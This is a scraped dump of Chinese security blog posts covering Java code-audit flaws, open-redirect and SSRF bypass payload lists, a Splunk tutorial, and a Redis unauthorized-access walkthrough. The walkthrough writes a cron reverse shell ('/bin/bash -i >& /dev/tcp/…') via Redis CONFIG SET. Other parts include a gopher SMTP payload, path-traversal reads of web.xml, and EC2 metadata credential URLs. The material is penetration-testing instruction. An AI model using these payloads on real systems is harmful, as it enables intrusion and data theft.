Dereference（空指针异常）1.1、产生原因： 当违反程序员的一个或多个假设时，通常会出现 null 指针异常。如果程序明确将对象设置为null，但稍后却间接引用该对象，则将出现 dereference-after-store 错误。此错误通常是因为程序员在声明变量时将变量初始化为 null。大部分空指针问题只会引起一般的软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些信息对于规划随后的攻击十分有用。 示例：在下列代码中，程序员将变量 foo 明确设置为 null。稍后，程序员间接引用 foo，而未检查对象是否为 null 值。 图1：引起Null Dereference漏洞的代码 2.2、修复方案： 在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。 图2：修复Null Dereference漏洞后的代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"敏感信息硬编码在程序中","slug":"代码审计-敏感信息硬编码在程序中","date":"2019-08-20T04:25:40.000Z","updated":"2020-01-19T07:28:31.772Z","comments":true,"path":"2019/08/20/代码审计-敏感信息硬编码在程序中/","link":"","permalink":"http://www.vkxss.top/2019/08/20/代码审计-敏感信息硬编码在程序中/","excerpt":"","text":"1、敏感信息硬编码在程序中 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.4、漏洞危害： 1.5、修复方案： 1、敏感信息硬编码在程序中1.1、描述： 如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。同时，硬编码敏感信息会增加代码管理和维护的难度。 1.2、审计方法： 全局搜索以下关键词 “password” 1.3、漏洞示例: 恶意用户可以使用javap -c IPaddress命令来反编译class来发现其中硬编码的服务器IP地址。反编译器的输出信息透露了服务器的明文IP地址：172.16.254.1。 图1：错误代码 1.4、漏洞危害： 很容易被攻击者利用，导致系统敏感信息泄露。 1.5、修复方案： 敏感信息存放在配置文件或数据库中并加密存储。(金融行业安全系数更高) 这个正确代码示例从一个安全目录下的外部文件获取服务器IP地址。并在其使用完后立即从内存中将其清除可以防止后续的信息泄露。 图2：正确代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"任意文件读取","slug":"代码审计-任意文件读取","date":"2019-08-19T06:13:12.000Z","updated":"2019-11-19T06:38:25.068Z","comments":true,"path":"2019/08/19/代码审计-任意文件读取/","link":"","permalink":"http://www.vkxss.top/2019/08/19/代码审计-任意文件读取/","excerpt":"","text":"1、Any File Read（任意文件读取） 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.3、漏洞危害: 1.4、修复方案： 1、Any File Read（任意文件读取）1.1、描述： 任意文件读取漏洞（Unrestricted File Upload），是一种常见的Web安全漏洞，因Web程序提供的文件查看下载、附件下载等功能存在安全缺陷，导致通过修改文件路径就能够查看和下载任意文件，这些文件包括：源代码文件、系统文件（/etc/passwd、C:/boot.ini等）、配置文件（config.php、/WEB-INF/web.xml、web.config等），造成网站敏感信息泄露，严重危害网站安全。 1.2、审计方法： 全局搜索以下关键词: “fileName”, “filePath”, “getFile”, “getWriter”, “MultipartFile”, “createNewFile”, “FileInputStream” 1.3、漏洞示例: 代码在 downloadFile()函数中获取请求参数中的affixalName的值，然后赋值给 FileName 变量，接着在 196 行处通过拼接字符串赋值给downPath 变量，然后在 198 行处调用 download 函数并把 downPath 的值传进函数，download 函数的代码如下: 图1：漏洞代码 download 函数把 filePath 处的文件写到 http 响应中，在整个流程中并没有对文件名的合法 性进行检查，存在任意文件下载漏洞，如通过把 affixalName 的值设置 为../../../WEB-INF/web.xml 可以下载网站的 web.xml 文件。 图2：漏洞代码 图3：漏洞代码 1.3、漏洞危害: 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取的配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。 1.4、修复方案： 指定下载路径以防止用户读取和下载指定目录以外的文件。","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"如何绕过URL限制","slug":"渗透测试-如何绕过URL限制","date":"2019-07-20T04:25:40.000Z","updated":"2019-09-23T08:02:38.060Z","comments":true,"path":"2019/07/20/渗透测试-如何绕过URL限制/","link":"","permalink":"http://www.vkxss.top/2019/07/20/渗透测试-如何绕过URL限制/","excerpt":"","text":"1、如何绕过URL限制 1.1、描述： 1.2、正常思路： 1.3、payload： 1.4、Bypass 0x01 利用问号绕过限制 0x02 利用反斜杠和正斜杠绕过限制 0x03 利用@绕过URL限制 0x04 利用白名单缺陷绕过限制 0x05 多重验证&amp;跳转绕过限制 0x06 点击触发达到绕过URL跳转限制 0x07 利用xip.io绕过 0x08 利用超链接绕过可信站点限制 0x09 POST参数中的URL跳转 0x10 利用#号绕过 0x09 FUZZ 1、如何绕过URL限制1.1、描述： URL重定向漏洞（URL redirection vulnerability），是一种常见的Web安全漏洞，由于网站URL重定向功能设计不当，没有验证跳转的目标URL是否合法，用户可通过此漏洞跳转到任意网站，这会导致可通过该网站跳转到存在木马、病毒的网站或者钓鱼网站，损害网站用户权利、网站名誉。 1.2、正常思路： 就是直接替换后面的URL来检测是否存在任意URL跳转，如果不存在，就直接返回到它自己的域名，如果存在，就跳转到你指定的URL 1.3、payload：123456789101112- ///www.baidu.com/%2f%2e%2e- /https://%5cbaidu.com/- //www.baidu.com- /www.baidu.com- https://www.google.com/www.baidu.com- /%2Fbaidu%252Ecom- http://www.google.com\\.baidu.com- http://www.google.com\\@baidu.com- http://www.google.com\\#baidu.com- http://www.google.com\\?baidu.com- http://www.google.com\\\\baidu.com- http://www.google.com\\baidu.com: 1.4、Bypass0x01 利用问号绕过限制 利用问号，这是一个特性，利用问号可以成功绕过URL限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com 1payload：http://www.test.com/abc？url=http//payload.com?test1.com 0x02 利用反斜杠和正斜杠绕过限制 比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名前加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com/login.aaa.com反斜杠有三种思路两个反斜杠绕过方法比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com一个反斜杠绕过方法如：http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com另一种思路，一个反斜杠一个点利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，如：http://www.aaa.com/acb?Url=http://test.com.login.aaa.com 1payload：/ \\ . 0x03 利用@绕过URL限制 如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。如：&lt;a href=”http://www.aaa.com/acb?Url=http://login.aaa.com@test.com“”&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com 后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的。 1payload：@ 0x04 利用白名单缺陷绕过限制 有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧。为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：http://www.aaa.com/acb?Url=http://login.aaa.com这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，如果包含，就直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。 1Payload:testaaa.com 0x05 多重验证&amp;跳转绕过限制 现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。多重跳转的问题导致可绕过URL限制比如http://www.aaa.com/acb?Url=http: … ttp://login.aaa.com当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。 0x06 点击触发达到绕过URL跳转限制 比如很多登陆页面的地方，其URL是一个跳转的URL如：http://www.aaa.com/acb?Url=http://test.com你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转。当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。 0x07 利用xip.io绕过 这个我还没有在测试中应用过，其请求是http://www.127.0.0.1.xip.io 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，http://www.qq.com.127.0.0.1.xip.io当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。 0x08 利用超链接绕过可信站点限制 比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了，难道就这样错失一个URL跳转漏洞了？其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。当然，百度这个302有点长，你给它进行加密就行。 0x09 POST参数中的URL跳转 当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交。当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息。为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行。在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！ 0x10 利用#号绕过 如：http://www.aaa.com/acb?Url=http://test.com#login.aaa.com 0x09 FUZZ 重定向Payloads by @cujanovichttps://github.com/cujanovic/Open-Redirect-Payloads 重定向参数 by @fuzzdb-projecthttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"SSRF绕过的方法","slug":"渗透测试-SSRF绕过的方法","date":"2019-07-19T06:25:40.000Z","updated":"2019-10-17T14:57:40.371Z","comments":true,"path":"2019/07/19/渗透测试-SSRF绕过的方法/","link":"","permalink":"http://www.vkxss.top/2019/07/19/渗透测试-SSRF绕过的方法/","excerpt":"","text":"1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复 1.9 参考文章 1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 1.2、漏洞寻找： 分享功能，通过 URL 地址分享网页内容 早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的标签或者标签中content的文本内容作为显示以提供更好的用户体验 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务 在线翻译：通过URL地址翻译对应文本的内容。 提供此功能的国内公司有百度、有道等 图片加载与下载：通过URL地址加载或下载图片 图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题） 图片、文章收藏功能 此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载 未公开的api实现以及其他调用URL的功能 此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。 文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。 链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。 文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。例子 PDF生成器：试着注入指向内部服务的&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;元素或者CSS的url()函数。 1.3 漏洞验证 排除法：浏览器f12查看源代码看是否是在本地进行了请求 1比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 dnslog等工具进行测试，看是否被访问 1可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 12从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址通过二级域名暴力猜解工具模糊猜测内网地址 直接返回的Banner、title、content等信息 留意bool型SSRF 1.4 利用方式 让服务端去访问相应的网址 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms 可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） 攻击内网应用程序（利用跨协议通信技术） 判断内网主机是否存活：方法是访问看是否有端口开放 ​- 某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。 12345URL parameter Response HTTP status RTT Conclusionhttp://127.0.0.1:22 200 10ms Port is openhttp://127.0.0.1:23 500 10ms Port is closedhttp://10.0.0.1/ 500 30010ms Firewalled or unable to route traffic to serverhttp://10.0.0.1:8080/ 500 10ms Port is closed and traffic is routed to server 对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。 DoS攻击（请求大文件，始终保持连接keep-alive always） 提取EC2配置文件 越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。这是AWS文档。如果你在EC2上发现了SSRF漏洞，试着请求http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载_ http://169.254.169.254/latest/user-data_和解压数据。 1.5、漏洞利用示例： 某度翻译SSRF： 某短网址SSRF： 1.6、Bypass 1.4.1 攻击本地 12http://127.0.0.1:80http://localhost:22 1.4.2利用[::] 123利用[::]绕过localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1也有看到利用http://0000::1:80/的，但是我测试未成功 1.4.3利用@ 123http://example.com@127.0.0.1http://A.com:B@127.0.0.1127.0.0.1#http://abc 1.4.4利用短地址 1234（1）百度短网址转换：https://dwz.cn #不支持ip http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 （2）TinyURL：https://tinyurl.com/create.php #支持ip 1.4.5利用特殊域名 12345678910111213利用的原理是DNS解析http://127.0.0.1.xip.io/http://www.owasp.org.127.0.0.1.xip.io/http://mysite.127.0.0.1.xip.iohttp://foo.bar.127.0.0.1.xip.io#利用ssrf.php?url=http://127.0.0.1.xip.io/orssrf.php?url=http://www.127.0.0.1.xip.io/orssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/orssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info 1.4.6 利用DNS解析 1域名上设置A记录，指向127.0.1 1.4.7 利用上传 1234也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 例子 1.4.8 利用Enclosed alphanumerics 1234567891011利用Enclosed alphanumericshttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 1.4.9 利用句号 1http://127。0。0。1 &gt;&gt;&gt; http://127.0.0.1 1.4.10 利用进制转换 – IP进制转换地址：转换地址 12345678910111213141516171819可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0xIP转换为-16进制-记得访问的时候加0X表示使用16进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001127转换为8进制：http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ip地址转换为10进制：http://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 12345678910111213#ip:127.0.0.1（1）8进制格式：0177.0.0.1（2）16进制格式：0x7F.00.00.01（3）8进制整数格式：017700000001（3）10进制整数格式：2130706433（4）16进制整数格式：0x7f000001#转换方法8进制前加0，16进制前加0x将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制 1.4.11 利用特殊地址 1http://0/ 1.4.12 利用协议 1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 1.4.13 利用301或者302跳转 123http://www.th1s.cn/test/ssrf.phpssrf.php里面的内容为：&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt; 1.4.14 使用组合 各种绕过进行自由组合即可 参考链接： 12345678910https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417 1.7 SSRF危害 主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息。 攻击运行在内外网主机的应用程序。 通过访问默认文件对内网 Web 应用进行指纹识别。 攻击内外网的 Web 应用，主要是使用 GET参数就可以实现的攻击。 利用file协议读取本地文件。 1.8 漏洞修复 禁止302跳转 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 限制请求的端口为http常用的端口，比如 80、443、8080、8090 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 1.9 参考文章 SSRF学习笔记 ssrf攻击内网应用 SSRF 学习笔记 gopher 协议攻击内网 mysql gopher SSRF攻击内网应用复现","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"日志分析神器_Splunk","slug":"应急-日志分析神器_Splunk","date":"2019-06-12T07:30:08.000Z","updated":"2019-09-20T02:00:53.772Z","comments":true,"path":"2019/06/12/应急-日志分析神器_Splunk/","link":"","permalink":"http://www.vkxss.top/2019/06/12/应急-日志分析神器_Splunk/","excerpt":"","text":"0x01安装 0x02日志分析 0x03分析案例 0x03.1 Splunk 名词说明 0x03.2 案例 案例一：统计-top 0x01安装 搭建系统环境 16.04.1-Ubuntu-64 Splunk splunk-7.3.0-657388c7a488-Linux-x86_64 下载解压（想要安装包请留言），如下图所示： 解压完后，cd到splunk/bin目录下启动，然后需要输入web登录的账户和密码，成功如下图所示： 1运行命令:sudo ./splunk start 查看虚拟机IP，在本地浏览器访问，输入自己设置的账户和密码即可： 0x02日志分析 载入需要分析的日志，一直下一步即可，注意修改下主机字段值，方便查找，最后点击提交即可： 0x03分析案例0x03.1 Splunk 名词说明12345678910Data Input : 添加数据 （文件或文件目录、TCP、UDP、WMI、Script, Forwarder…）Source type ： 来源类型 （apache logs, security log、network log…）Host ：主机 （apache1、apche2, apcahe3…) Source：数据源 （/opt/apache/log/*.*）Index：索引（Splunk 索引）Field：字段： 正则表达式 (Regular Expression) 取出符合某个条件字段Search Language：搜索语句 （缩小范围 -&gt; 计算 -&gt; 呈现 ）Saved Search： 搜索语句储存，未来可以直接使用Report ： 報表，搜索结果 -&gt; 图形报表Alert：告警，搜索结果通报 0x03.2 案例案例一：统计-top 分析状态码为200、攻击者前10的IP地址，如下图所示：","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://www.vkxss.top/categories/应急响应/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"http://www.vkxss.top/tags/应急响应/"}]},{"title":"Redis未授权访问漏洞之ubuntu反弹shell问题","slug":"渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题","date":"2019-05-28T06:25:40.000Z","updated":"2019-12-12T07:56:19.135Z","comments":true,"path":"2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/","link":"","permalink":"http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/","excerpt":"","text":"0x00 背景 0x01 环境准备 0x02 具体过程 0x02.1 安装redis 0x02.2 修改远程登陆配置文件 0x02.3 攻击利用 0x02.4 利用计划任务执行命令反弹shell 扩展思路 下载后放到 redis-rce 目录下 此处可以通过 -p 去设置目标端口（默认6379） 参考链接 0x00 背景 在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题。 0x01 环境准备 ubuntu16.04，用来任务计划反弹shell的靶机 MAC，用来接收ubuntu反弹过来的shell redis4.0.10未授权访问漏洞 0x02 具体过程0x02.1 安装redis 安装：下载、解压、编译 12345$ wget http://download.redis.io/releases/redis-4.0.10.tar.gz$ tar xzf redis-4.0.10.tar.gz$ mv redis-4.0.10 /usr/local/redis$ cd /usr/local/redis$ make 创建服务：二进制文件是编译完成后在src目录下，客户端是/usr/local/redis/src/redis-cli，服务器是/usr/local/redis/src/redis-server。下面为这两个文件做软链接。 12$ ln -s /usr/local/redis/src/redis-cli /usr/bin/redis$ ln -s /usr/local/redis/src/redis-server /usr/bin/redisd 测试是否成功安装 至此，表明你的redis已经安装完毕。 0x02.2 修改远程登陆配置文件123456789$ vim /usr/local/redis/redis.conf 配置文件 bind 127.0.0.1前面加上#号 protected-mode设为no $ 启动服务 redisd /usr/local/redis/redis.conf注释：- 关闭protected-mode模式，此时外部网络可以直接访问- 开启protected-mode保护模式，需配置bind ip或者设置访问密码- redis.conf配置文件中daemonize守护线程，默认是NO 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件！！ 0x02.3 攻击利用 redis基本命令 123456789101112131415161718192021连接redis：redis-cli -h 192.168.1.108查看redis版本信息、一些具体信息、服务器版本信息等等：192.168.1.108:6379&gt;info将变量x的值设为test：192.168.1.108:6379&gt;set x &quot;test&quot;获取设置的某个变量的值：192.168.1.108:6379&gt;get x`flushall`是把整个redis数据库删除，一般情况下不要用！！！192.168.1.108:6379&gt;flushall查看所有键：192.168.1.108:6379&gt;KEYS *获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。192.168.1.108:6379&gt;CONFIG GET dir192.168.1.108:6379&gt;CONFIG GET dbfilename 0x02.4 利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 1234567891011121314151617先在自己的服务器上监听一个端口nc -lvnp 7999然后执行命令:root@kali:~# redis-cli -h 192.168.1.108192.168.1.108:6379&gt; set xx &quot;\\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot;OK192.168.1.108:6379&gt; config set dir /var/spool/cron/OK192.168.1.108:6379&gt; config set dbfilename rootOK192.168.1.108:6379&gt; saveOK 